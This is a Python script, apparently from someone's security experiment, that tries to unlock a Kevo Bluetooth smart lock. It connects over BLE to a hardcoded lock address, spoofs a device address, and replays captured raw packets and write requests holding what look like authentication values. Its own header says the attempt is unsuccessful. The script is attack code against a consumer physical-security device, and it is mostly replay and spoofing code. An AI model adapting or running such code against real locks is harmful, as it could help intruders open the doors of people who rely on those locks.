#!/bin/python

# Unlock Kevo
# Unsuccessful, cannot get write commands to work
# Kevo 			7C:66:9D:94:1F:95
# Host 			98:58:8A:05:09:45

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()

	rand = "00"
	ci_comm = "01"
	createleconn = "0D20"
	param_length = "19"
	scan_interval = "0400"
	scan_window = "0400"
	init_filter = "00"
	peer_addr = random
	BD_addr = addr
	own_addr = "01"
	conn_interval_min = "1800"
	conn_interval_max = "1800"
	conn_latency = "0000"
	supv_timeout = "4800"
	min_CE = "0100"
	max_CE = "0100"

	Cust_Connect(s, "951f949d667c", rand, scan_interval, scan_window, own_addr, conn_interval_min, conn_interval_max, supv_timeout)

	spoof(s, "5b9fb18bb174")

	# change MTU
	ran = bytearray.fromhex("024000070003000400029e00")
	s.send(ran)

	# unknown direction (Reserved)
	ran = bytearray.fromhex("0240000b0007003a0009050100000000")
	s.send(ran)

	# Find by type value
	ran = bytearray.fromhex("0240001b0017000400063e00ffff0028b0c1a06807e346aae54f42e947021386")
	s.send(ran)

	# Read by type request
	ran = bytearray.fromhex("0240000b0007000400083d0045000328")
	s.send(ran)

	# occurs during connection prior to unlock conenction
	writereq(s, "4200","00000001")
	writereq(s, "2500", "934800cad7299ec1481791303d7c90d549352398")
	writereq(s, "4200","01000001")
	writereq(s, "4200","05000012")
	writereq(s, "3F00", "109d3608aeab11ccfa1cad28bd92fe552913d852")
	writereq(s, "3F00", "15ecf3e16b235fad3ffab38c")
	writereq(s, "4200","00000003")
	writereq(s, "4200","01460004")
	writereq(s, "4200","02000012")

	# connection oriented channel
	ran = bytearray.fromhex("0240001b0017000401260100ffff0028b0c1a46807e346aae54f42e947021386")
	s.send(ran)

	# unknown direction (Reserved)
	ran = bytearray.fromhex("0240000b0007003a0009050100000000")
	s.send(ran)

	writereq(s, "1400","00000001")
	writereq(s, "1400","01000001")
	writereq(s, "1400","05000012")
	writereq(s, "1100","f952999d85384ffa802a501143e7d1018389b56e")
	# writereq(s, "0D00","01000121cc9d2f9919301591")

	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
    main()
